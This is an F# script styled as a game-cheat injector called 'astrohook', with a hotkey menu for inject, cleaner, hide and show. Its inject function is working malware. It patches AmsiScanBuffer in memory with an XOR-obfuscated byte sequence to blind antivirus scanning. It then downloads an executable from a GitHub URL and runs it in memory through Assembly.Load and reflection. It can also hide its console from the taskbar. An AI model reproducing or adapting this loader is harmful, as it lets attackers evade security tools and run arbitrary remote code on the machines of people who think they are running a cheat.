#r "System.Net.Http.dll"
#r "System.Runtime.InteropServices.dll"

open System
open System.Net
open System.Reflection
open System.Runtime.InteropServices
open System.Diagnostics
open System.Threading
open System.IO

[<DllImport("kernel32.dll")>]
extern IntPtr GetConsoleWindow()

[<DllImport("user32.dll")>]
extern bool ShowWindow(IntPtr hWnd, int nCmdShow)

[<DllImport("user32.dll")>]
extern bool SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong)

[<DllImport("user32.dll")>]
extern int GetWindowLong(IntPtr hWnd, int nIndex)

[<DllImport("kernel32.dll")>]
extern IntPtr GetProcAddress(IntPtr h, string n)

[<DllImport("kernel32.dll")>]
extern IntPtr LoadLibrary(string l)

[<DllImport("user32.dll")>]
extern int16 GetAsyncKeyState(int vKey)

type VP = delegate of IntPtr * UIntPtr * uint * byref<uint> -> bool

let SW_HIDE = 0
let SW_RESTORE = 9
let SW_SHOW = 5
let GWL_EXSTYLE = -20
let WS_EX_TOOLWINDOW = 0x00000080
let WS_EX_APPWINDOW = 0x00040000
let VK_SHIFT = 0x10
let VK_F1 = 0x70
let VK_F2 = 0x71
let VK_F3 = 0x72
let VK_F4 = 0x73
let VK_ESCAPE = 0x1B

let clearScreen () = Console.Clear()
let writeLine (s: string) = Console.WriteLine(s)
let writeColor (s: string) (c: ConsoleColor) =
    Console.ForegroundColor <- c
    Console.WriteLine(s)
    Console.ResetColor()
let beep () = Console.Beep(800, 100)

let hideConsole () =
    let hWnd = GetConsoleWindow()
    let exStyle = GetWindowLong(hWnd, GWL_EXSTYLE)
    SetWindowLong(hWnd, GWL_EXSTYLE, (exStyle ||| WS_EX_TOOLWINDOW) &&& (~~~WS_EX_APPWINDOW)) |> ignore
    ShowWindow(hWnd, SW_HIDE) |> ignore

let showConsole () =
    let hWnd = GetConsoleWindow()
    let exStyle = GetWindowLong(hWnd, GWL_EXSTYLE)
    SetWindowLong(hWnd, GWL_EXSTYLE, (exStyle ||| WS_EX_APPWINDOW) &&& (~~~WS_EX_TOOLWINDOW)) |> ignore
    ShowWindow(hWnd, SW_RESTORE) |> ignore
    ShowWindow(hWnd, SW_SHOW) |> ignore

let restartMSpaint () =
    try
        for p in Process.GetProcessesByName("mspaint") do
            try 
                p.CloseMainWindow() |> ignore
                if not (p.WaitForExit(1000)) then p.Kill()
            with _ -> ()
        let path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "mspaint.exe")
        if File.Exists(path) then Process.Start(path) |> ignore
        beep()
    with _ -> ()

let DeMask (d: byte[]) (k: byte) = d |> Array.map (fun b -> b ^^^ k)

let downloadAndInject () =
    try
        let mutable o = 0u
        let a = LoadLibrary("amsi.dll")
        let k = LoadLibrary("kernel32.dll")
        let v = Marshal.GetDelegateForFunctionPointer(GetProcAddress(k, "VirtualProtect"), typeof<VP>) :?> VP
        let pS = GetProcAddress(a, "AmsiScanBuffer")
        if pS <> IntPtr.Zero && v.Invoke(pS, UIntPtr(6u), 0x40u, &o) then
            Marshal.Copy(DeMask [| 0x03uy; 0xECuy; 0xBBuy; 0xBCuy; 0x3Buy; 0x78uy |] 0xBBuy, 0, pS, 6)

        let u = "https://github.com/hugoleitevitor-cyber/aaaaaaaaaaaaaaa/raw/refs/heads/main/payyload.exe"
        use client = new WebClient()
        client.Proxy <- null
        let d = client.DownloadData(u)
        let s = Assembly.Load(d)

        let t = new Thread(fun () ->
            try
                let f = BindingFlags.Public ||| BindingFlags.NonPublic ||| BindingFlags.Static ||| BindingFlags.Instance
                let m = if s.EntryPoint <> null then s.EntryPoint else s.GetTypes().[0].GetMethods(f).[0]
                m.Invoke(null, null) |> ignore
            with _ -> ()
        )
        t.Start()
        beep()
    with _ -> ()

let drawPanel () =
    clearScreen()
    Console.ForegroundColor <- ConsoleColor.White
    writeLine "                       @@@@@@@+"
    writeLine "                        @@@@@@@+"
    writeLine "                         @@@@@@@+"
    writeLine "                          @@@@@@@+"
    writeLine "                           @@@@@@@+"
    writeLine "                 @@@@@@.    @@@@@@@+"
    writeLine "                @@@@@@.      @@@@@@@+"
    writeLine "               @@@@@@.        @@@@@@@*"
    writeLine "              @@@@@@.  -@@@@@@@@@@@@@@*"
    writeLine "             @@@@@@.  -@@@@@@@@@@@@@@@@*"
    writeLine "            @@@@@@   -@@@@@@@@@@@@@@@@@@#"
    writeLine ""
    Console.ForegroundColor <- ConsoleColor.White
    writeLine "  astrohook"
    Console.ForegroundColor <- ConsoleColor.DarkGray
    writeLine "  bypass mta"
    writeLine ""
    writeColor "  [shift+f1]  inject" ConsoleColor.Cyan
    writeColor "  [shift+f2]  cleaner" ConsoleColor.Yellow
    writeColor "  [shift+f3]  hide" ConsoleColor.Green
    writeColor "  [shift+f4]  show" ConsoleColor.Green

Console.Title <- ""
drawPanel()

let mutable isHidden = false
let mutable running = true

while running do
    let shift = GetAsyncKeyState(VK_SHIFT) &&& 0x8000s <> 0s
    let f1 = GetAsyncKeyState(VK_F1) &&& 0x8000s <> 0s
    let f2 = GetAsyncKeyState(VK_F2) &&& 0x8000s <> 0s
    let f3 = GetAsyncKeyState(VK_F3) &&& 0x8000s <> 0s
    let f4 = GetAsyncKeyState(VK_F4) &&& 0x8000s <> 0s
    let esc = GetAsyncKeyState(VK_ESCAPE) &&& 0x8000s <> 0s

    if esc then
        running <- false
    elif shift && f1 then
        clearScreen()
        writeLine "inject..."
        downloadAndInject()
        Thread.Sleep(2000)
        if not isHidden then drawPanel()
    elif shift && f2 then
        clearScreen()
        writeLine "cleaner..."
        restartMSpaint()
        Thread.Sleep(1000)
        if not isHidden then drawPanel()
    elif shift && f3 then
        hideConsole()
        isHidden <- true
    elif shift && f4 then
        showConsole()
        isHidden <- false
        drawPanel()
    Thread.Sleep(100)
;;